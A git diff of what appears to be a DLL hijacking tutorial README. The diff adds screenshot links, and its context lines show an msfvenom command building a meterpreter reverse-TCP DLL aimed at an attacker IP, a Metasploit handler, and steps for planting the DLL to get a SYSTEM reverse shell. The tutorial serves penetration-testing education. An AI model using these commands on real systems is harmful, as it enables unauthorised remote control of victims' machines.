@@ -36,6 +36,7 @@ DLL files contains executable code that can be used by other applications. When 
 ``` 
    $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.252.130 LPORT=8888 -f dll > VERSION.dll 
 ```
+![MsfVenom](https://github.com/NayanDZ/DLLHijacking/blob/main/4.jpg)
 
 > **Step-5: Now create reverse shell handler with msfconsole**
 
@@ -56,7 +57,7 @@ DLL files contains executable code that can be used by other applications. When 
    msf exploit(multi/handler) > exploit  
 ```
    Done..! 
-
+![MsfVenom](https://github.com/NayanDZ/DLLHijacking/blob/main/5.jpg)
 > **Step-6: Reverse shell handler created, now paste malicious DLL(created through Step-4) in to the application directory and launch application**
 
    As you can see application is trying to loan the malicious DLL without checking it and we got system reverse shell.
